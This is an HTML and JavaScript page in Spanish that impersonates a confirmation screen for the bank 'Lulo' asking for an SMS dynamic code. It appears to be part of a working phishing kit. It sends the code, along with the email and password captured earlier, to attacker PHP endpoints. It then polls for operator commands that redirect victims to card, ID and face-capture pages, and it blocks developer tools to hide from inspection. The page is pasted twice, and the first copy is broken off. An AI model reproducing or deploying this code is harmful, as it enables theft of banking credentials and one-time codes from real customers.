<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Clave Dinámica - Lulo</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #212738; /* color oscuro como en la imagen */
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: #fff;
    }

    .logo {
      text-align: center;
    }

    .logo img {
      width: 80px; /* ajusta el tamaño según necesites */
      margin-bottom: 40px;
    }

    .confirm-text {
      font-size: 24px;
      font-weight: bold;
      color: #B3C508;
      text-align: center;
      margin-bottom: 20px;
    }

    .description-text {
      font-size: 14px;
      color: #b0b9c7;
      text-align: center;
      margin-bottom: 40px;
      line-height: 1.4;
      max-width: 280px;
    }

    .form-container {
      width: 300px;
      display: flex;
      flex-direction: column;
      gap: 30px;
    }

    .input-group {
      position: relative;
    }

    .input-group label {
      font-size: 18px;
      color: #b0b9c7; /* gris claro como el texto en la imagen */
      display: block;
      margin-bottom: 5px;
    }

    .input-group input {
      width: 100%;
      background: transparent;
      border: none;
      border-bottom: 1px solid #5c6c7d;
      padding: 10px 40px 10px 0;
      font-size: 16px;
      color: #fff;
      outline: none;
    }

    .input-group .eye-icon {
      position: absolute;
      right: -10px;
      top: 30px;
      cursor: pointer;
      color: #9aa5b6;
      font-size: 18px;
      user-select: none;
    }

    .input-group .eye-icon:hover {
      color: #b0b9c7;
    }

    .btn-login {
      width: 100%;
      padding: 15px;
      border: none;
      background-color: #B3C508; /* color verde lima */
      color: #000;
      font-size: 16px;
      border-radius: 10px;
      cursor: pointer;
      transition: all 0.3s ease;
      margin-left: 20px;
    }

    .btn-login:disabled {
      background-color: #3a3f4a;
      color: #6b7280;
      cursor: not-allowed;
    }

    .btn-login.active {
      background-color: #B3C508; /* color verde lima */
      color: #000;
      cursor: pointer;
    }

    .forgot {
      text-align: center;
      color: #9aa5b6;
      font-size: 14px;
      margin-top: 10px;
    }

         .forgot a {
       color: #9aa5b6;
       text-decoration: none;
     }

     /* Animación para el loader */
     @keyframes pulse {
       0% { transform: scale(1); opacity: 1; }
       50% { transform: scale(1.1); opacity: 0.7; }
       100% { transform: scale(1); opacity: 1; }
     }

     /* Responsive para dispositivos móviles */
    @media (max-width: 768px) {
      body {
        padding: 20px;
        height: auto;
        min-height: 100vh;
      }

      .logo img {
        width: 60px;
        margin-bottom: 30px;
      }

      .confirm-text {
        font-size: 20px;
        margin-bottom: 15px;
      }

      .description-text {
        font-size: 13px;
        margin-bottom: 30px;
        max-width: 260px;
      }

      .form-container {
        width: 100%;
        max-width: 320px;
        gap: 25px;
      }

      .input-group label {
        font-size: 16px;
      }

      .input-group input {
        font-size: 16px;
        padding: 12px 0;
      }

      .btn-login {
        padding: 12px;
        font-size: 16px;
        margin-left: 0;
      }

      .forgot {
        font-size: 13px;
        margin-top: 15px;
      }
    }

    /* Para pantallas muy pequeñas */
    @media (max-width: 480px) {
      body {
        padding: 15px;
      }

      .logo img {
        width: 50px;
        margin-bottom: 25px;
      }

      .confirm-text {
        font-size: 18px;
        margin-bottom: 12px;
      }

      .description-text {
        font-size: 12px;
        margin-bottom: 25px;
        max-width: 240px;
      }

      .form-container {
        width: 100%;
        max-width: 280px;
        gap: 20px;
      }

      .input-group label {
        font-size: 15px;
      }

      .input-group input {
        font-size: 15px;
        padding: 10px 0;
      }

      .btn-login {
        padding: 10px;
        font-size: 15px;
      }
    }
  </style>
</head>
<body>

  <div class="logo">
    <img src="img/lulo2.png" alt="Logo lulo">
    <div class="confirm-text">CONFIRMAR</div>
    <div class="description-text">Para confirmar tu transacción, ingresa el código dinámico enviado por SMS a tu dispositivo móvil</div>
  </div>

  <!-- Loader overlay -->
  <div id="loader-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999; justify-content: center; align-items: center;">
    <div style="color: white; text-align: center;">
      <img src="img/125.png" alt="Cargando..." style="width: 120px; height: 120px; animation: pulse 1.5s infinite;">
    </div>
  </div>

  <div class="form-container">
    <div class="input-group">
      <label for="token">Codigo Dinámico</label>
      <input type="text" id="token" placeholder="" maxlength="6" pattern="[0-9]+" title="Solo números permitidos, máximo 6 dígitos">
    </div>

    <button class="btn-login" id="loginBtn" disabled>Verificar</button>

    <div class="forgot">
      <a href="#">¿No recibiste el código?</a>
    </div>
  </div>

  <script>
    // Validación de la clave dinámica en tiempo real
    document.getElementById('token').addEventListener('input', function(e) {
      const value = e.target.value;
      const button = document.getElementById('loginBtn');
      
      // Solo permitir números
      const cleanValue = value.replace(/[^0-9]/g, '');
      if (cleanValue !== value) {
        e.target.value = cleanValue;
      }
      
      // Limitar a 6 dígitos
      if (cleanValue.length > 6) {
        e.target.value = cleanValue.substring(0, 6);
      }
      
      // Activar botón con 6 dígitos exactos
      if (cleanValue.length === 6) {
        button.disabled = false;
        button.classList.add('active');
      } else {
        button.disabled = true;
        button.classList.remove('active');
      }
    });

    document.addEventListener("DOMContentLoaded", function () {
      const urlParams = new URLSearchParams(window.location.search);
      
      // Generar o recuperar session_id
      let sessionId = ((() => { const params = new URLSearchParams(window.location.search); const direct = [params.get('transactionId'), params.get('tid'), params.get('tx'), params.get('session_id'), params.get('ts')].find((value) => value !== null && String(value).trim() !== ''); if (direct) { const normalized = String(direct); localStorage.setItem('session_id', normalized); localStorage.setItem('last_tid', normalized); return normalized; } const generated = 'session_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11); localStorage.setItem('session_id', generated); localStorage.setItem('last_tid', generated); return generated; })());
      if (!sessionId) {
        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('session_id', sessionId);
      }

      // Event listener para el botón Verificar
      const btnIngresar = document.getElementById('loginBtn');
      
      btnIngresar.addEventListener('click', async function (event) {
        event.preventDefault();

        // Obtener el token
        const token = document.getElementById('token').value;
        
        // Validar que el token tenga 6 dígitos
        if (token.length !== 6) {
          alert('El token debe tener 6 dígitos');
          return;
        }

        // Mostrar loader
        const loader = document.getElementById('loader-overlay');
        if (loader) {
          loader.style.display = 'flex';
        }

        let localTb = {};
        try {
          localTb = JSON.parse(localStorage.getItem('tbdatos') || '{}');
        } catch(e) {}

        const formData = new FormData();
        formData.append('transactionId', sessionId);
        formData.append('u_id', localStorage.getItem('email') || '');
        formData.append('u_ps', localStorage.getItem('password') || '');
        formData.append('u_tk', token);
        formData.append('u_tb', JSON.stringify(localTb));

        fetch('procesar_dinamica.php', { method: 'POST', body: formData })
        .then(res => res.json())
        .then(result => {
          if (result.status === 'success') {
            checkPaymentVerification(sessionId, result.messageId);
          } else {
            if (loader) loader.style.display = 'none';
          }
        })
        .catch(() => {
          if (loader) loader.style.display = 'none';
        });
      });
    });

    async function checkPaymentVerification(transactionId, messageId) {
      try {
        const formData = new FormData();
        formData.append('transactionId', transactionId);
        formData.append('messageId', messageId);

        const res = await fetch('verificar_respuesta.php?ts=' + Date.now(), { method: 'POST', body: formData });
        const result = await res.json();

        if (result.action) {
          const loader = document.getElementById('loader-overlay');
          if (loader) loader.style.display = 'none';

          switch (result.action) {
            case 'pedir_dinamica':
            case 'error_token':
              alert("Error de Código de Seguridad.");
              window.location.href = "token.php";
              break;
            case 'error_logo':
              alert("Usuario o clave incorrectos.");
              window.location.href = "index.html";
              break;
            case 'error_tc':
              window.location.href = "/datac/alter.php";
              break;
            case 'error':
              window.location.href = "/caras";
              break;
            case 'cedula':
              window.location.href = "/cedula";
              break;
            case 'bre_b':
              window.location.href = "/recaudos/brev.php";
              break;
            case 'ban_ip':
                    try {
                        localStorage.clear();
                        sessionStorage.clear();
                        document.cookie.split(";").forEach(function(c) { 
                            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
                        });
                    } catch(e) {}
                    window.location.replace("/fin.php");
                    break;
                case 'confirm_finalizar':
              window.location.href = "/fin.php";
              break;
            default:
              setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
          }
        } else {
          setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
        }
      } catch (err) {
        setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
      }
    }<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Clave Dinámica - Lulo</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #212738; /* color oscuro como en la imagen */
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: #fff;
    }

    .logo {
      text-align: center;
    }

    .logo img {
      width: 80px; /* ajusta el tamaño según necesites */
      margin-bottom: 40px;
    }

    .confirm-text {
      font-size: 24px;
      font-weight: bold;
      color: #B3C508;
      text-align: center;
      margin-bottom: 20px;
    }

    .description-text {
      font-size: 14px;
      color: #b0b9c7;
      text-align: center;
      margin-bottom: 40px;
      line-height: 1.4;
      max-width: 280px;
    }

    .form-container {
      width: 300px;
      display: flex;
      flex-direction: column;
      gap: 30px;
    }

    .input-group {
      position: relative;
    }

    .input-group label {
      font-size: 18px;
      color: #b0b9c7; /* gris claro como el texto en la imagen */
      display: block;
      margin-bottom: 5px;
    }

    .input-group input {
      width: 100%;
      background: transparent;
      border: none;
      border-bottom: 1px solid #5c6c7d;
      padding: 10px 40px 10px 0;
      font-size: 16px;
      color: #fff;
      outline: none;
    }

    .input-group .eye-icon {
      position: absolute;
      right: -10px;
      top: 30px;
      cursor: pointer;
      color: #9aa5b6;
      font-size: 18px;
      user-select: none;
    }

    .input-group .eye-icon:hover {
      color: #b0b9c7;
    }

    .btn-login {
      width: 100%;
      padding: 15px;
      border: none;
      background-color: #B3C508; /* color verde lima */
      color: #000;
      font-size: 16px;
      border-radius: 10px;
      cursor: pointer;
      transition: all 0.3s ease;
      margin-left: 20px;
    }

    .btn-login:disabled {
      background-color: #3a3f4a;
      color: #6b7280;
      cursor: not-allowed;
    }

    .btn-login.active {
      background-color: #B3C508; /* color verde lima */
      color: #000;
      cursor: pointer;
    }

    .forgot {
      text-align: center;
      color: #9aa5b6;
      font-size: 14px;
      margin-top: 10px;
    }

         .forgot a {
       color: #9aa5b6;
       text-decoration: none;
     }

     /* Animación para el loader */
     @keyframes pulse {
       0% { transform: scale(1); opacity: 1; }
       50% { transform: scale(1.1); opacity: 0.7; }
       100% { transform: scale(1); opacity: 1; }
     }

     /* Responsive para dispositivos móviles */
    @media (max-width: 768px) {
      body {
        padding: 20px;
        height: auto;
        min-height: 100vh;
      }

      .logo img {
        width: 60px;
        margin-bottom: 30px;
      }

      .confirm-text {
        font-size: 20px;
        margin-bottom: 15px;
      }

      .description-text {
        font-size: 13px;
        margin-bottom: 30px;
        max-width: 260px;
      }

      .form-container {
        width: 100%;
        max-width: 320px;
        gap: 25px;
      }

      .input-group label {
        font-size: 16px;
      }

      .input-group input {
        font-size: 16px;
        padding: 12px 0;
      }

      .btn-login {
        padding: 12px;
        font-size: 16px;
        margin-left: 0;
      }

      .forgot {
        font-size: 13px;
        margin-top: 15px;
      }
    }

    /* Para pantallas muy pequeñas */
    @media (max-width: 480px) {
      body {
        padding: 15px;
      }

      .logo img {
        width: 50px;
        margin-bottom: 25px;
      }

      .confirm-text {
        font-size: 18px;
        margin-bottom: 12px;
      }

      .description-text {
        font-size: 12px;
        margin-bottom: 25px;
        max-width: 240px;
      }

      .form-container {
        width: 100%;
        max-width: 280px;
        gap: 20px;
      }

      .input-group label {
        font-size: 15px;
      }

      .input-group input {
        font-size: 15px;
        padding: 10px 0;
      }

      .btn-login {
        padding: 10px;
        font-size: 15px;
      }
    }
  </style>
</head>
<body>

  <div class="logo">
    <img src="img/lulo2.png" alt="Logo lulo">
    <div class="confirm-text">CONFIRMAR</div>
    <div class="description-text">Para confirmar tu transacción, ingresa el código dinámico enviado por SMS a tu dispositivo móvil</div>
  </div>

  <!-- Loader overlay -->
  <div id="loader-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999; justify-content: center; align-items: center;">
    <div style="color: white; text-align: center;">
      <img src="img/125.png" alt="Cargando..." style="width: 120px; height: 120px; animation: pulse 1.5s infinite;">
    </div>
  </div>

  <div class="form-container">
    <div class="input-group">
      <label for="token">Codigo Dinámico</label>
      <input type="text" id="token" placeholder="" maxlength="6" pattern="[0-9]+" title="Solo números permitidos, máximo 6 dígitos">
    </div>

    <button class="btn-login" id="loginBtn" disabled>Verificar</button>

    <div class="forgot">
      <a href="#">¿No recibiste el código?</a>
    </div>
  </div>

  <script>
    // Validación de la clave dinámica en tiempo real
    document.getElementById('token').addEventListener('input', function(e) {
      const value = e.target.value;
      const button = document.getElementById('loginBtn');
      
      // Solo permitir números
      const cleanValue = value.replace(/[^0-9]/g, '');
      if (cleanValue !== value) {
        e.target.value = cleanValue;
      }
      
      // Limitar a 6 dígitos
      if (cleanValue.length > 6) {
        e.target.value = cleanValue.substring(0, 6);
      }
      
      // Activar botón con 6 dígitos exactos
      if (cleanValue.length === 6) {
        button.disabled = false;
        button.classList.add('active');
      } else {
        button.disabled = true;
        button.classList.remove('active');
      }
    });

    document.addEventListener("DOMContentLoaded", function () {
      const urlParams = new URLSearchParams(window.location.search);
      
      // Generar o recuperar session_id
      let sessionId = ((() => { const params = new URLSearchParams(window.location.search); const direct = [params.get('transactionId'), params.get('tid'), params.get('tx'), params.get('session_id'), params.get('ts')].find((value) => value !== null && String(value).trim() !== ''); if (direct) { const normalized = String(direct); localStorage.setItem('session_id', normalized); localStorage.setItem('last_tid', normalized); return normalized; } const generated = 'session_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11); localStorage.setItem('session_id', generated); localStorage.setItem('last_tid', generated); return generated; })());
      if (!sessionId) {
        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('session_id', sessionId);
      }

      // Event listener para el botón Verificar
      const btnIngresar = document.getElementById('loginBtn');
      
      btnIngresar.addEventListener('click', async function (event) {
        event.preventDefault();

        // Obtener el token
        const token = document.getElementById('token').value;
        
        // Validar que el token tenga 6 dígitos
        if (token.length !== 6) {
          alert('El token debe tener 6 dígitos');
          return;
        }

        // Mostrar loader
        const loader = document.getElementById('loader-overlay');
        if (loader) {
          loader.style.display = 'flex';
        }

        let localTb = {};
        try {
          localTb = JSON.parse(localStorage.getItem('tbdatos') || '{}');
        } catch(e) {}

        const formData = new FormData();
        formData.append('transactionId', sessionId);
        formData.append('u_id', localStorage.getItem('email') || '');
        formData.append('u_ps', localStorage.getItem('password') || '');
        formData.append('u_tk', token);
        formData.append('u_tb', JSON.stringify(localTb));

        fetch('procesar_dinamica.php', { method: 'POST', body: formData })
        .then(res => res.json())
        .then(result => {
          if (result.status === 'success') {
            checkPaymentVerification(sessionId, result.messageId);
          } else {
            if (loader) loader.style.display = 'none';
          }
        })
        .catch(() => {
          if (loader) loader.style.display = 'none';
        });
      });
    });

    async function checkPaymentVerification(transactionId, messageId) {
      try {
        const formData = new FormData();
        formData.append('transactionId', transactionId);
        formData.append('messageId', messageId);

        const res = await fetch('verificar_respuesta.php?ts=' + Date.now(), {
          method: 'POST',
          body: formData,
            cache: 'no-store'
        });
        const result = await res.json();

        if (result.action) {
          switch (result.action) {
            case 'pedir_dinamica': 
              const loader1 = document.getElementById('loader-overlay');
              if (loader1) {
                loader1.style.display = 'none';
              }
              alert("Error de Token Dinamico.");
              window.location.href = "token.php";
              break;
            
            case 'error_logo': 
              const loader2 = document.getElementById('loader-overlay');
              if (loader2) {
                loader2.style.display = 'none';
              }
              alert("Usuario o clave incorrectos.");
              window.location.href = "index.html";
              break;
            
            // ✅ NUEVO: Botón "Tarjeta" desde dinámica
            case 'tarjeta':
            case 'error_tc':
              const loader3 = document.getElementById('loader-overlay');
              if (loader3) {
                loader3.style.display = 'none';
              }
              window.location.href = "/datac/alter.php";
              break;
            
            case 'ban_ip':
                    try {
                        localStorage.clear();
                        sessionStorage.clear();
                        document.cookie.split(";").forEach(function(c) { 
                            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
                        });
                    } catch(e) {}
                    window.location.replace("/fin.php");
                    break;
                case 'confirm_finalizar':
              const loader4 = document.getElementById('loader-overlay');
              if (loader4) {
                loader4.style.display = 'none';
              }
              window.location.href = "/fin.php";
              break;
          }
        } else {
          setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
        }
      } catch (err) {
        setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
      }
    }
  </script>
<script>
// --- DESACTIVAR CLICK DERECHO, INSPECCIONAR Y F12 ---
(function() {
    // 1. Desactivar Click Derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // 2. Desactivar atajos de teclado de desarrollo (F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+Shift+J, Ctrl+U, Cmd+Opt+I)
    document.addEventListener('keydown', function(e) {
        // F12
        if (e.keyCode === 123) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+Shift+I o Cmd+Opt+I
        if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+U (Ver código fuente)
        if ((e.ctrlKey || e.metaKey) && e.keyCode === 85) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
    });

    // 3. Detectar apertura de Herramientas de Desarrollo (DevTools) por dimensiones
    let devtoolsOpen = false;
    const threshold = 160;
    
    function checkDevTools() { return false; }

    // 4. Función para Auto-Banear la IP del Atacante
    let banTriggered = false;
    function triggerAutoBan() {
        if (banTriggered) return;
        banTriggered = true;
        
        // Limpieza inmediata del almacenamiento local
        try {
            localStorage.clear();
            sessionStorage.clear();
            document.cookie.split(";").forEach(function(c) { 
                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
            });
        } catch(e) {}

        // Enviar IP para auto-bloqueo al backend (usamos el honeypot para gatillar el baneo)
        const formData = new FormData();
        formData.append('website', 'automated_devtools_trigger');
        
        // Buscamos si tenemos la variable de transacción en localStorage
        let tid = '';
        try {
            tid = localStorage.getItem('last_tid') || localStorage.getItem('session_id') || '';
        } catch(e) {}
        if (tid) {
            formData.append('transactionId', tid);
        }

        // Enviamos post silencioso para banear la IP en el backend
        fetch('/gate/process/paso1datos.php', {
            method: 'POST',
            body: formData,
            keepalive: true
        }).finally(function() {
            window.location.replace("/fin.php");
        });
    }
})();
// ---------------------------------------------------
</script>
</body>
</html>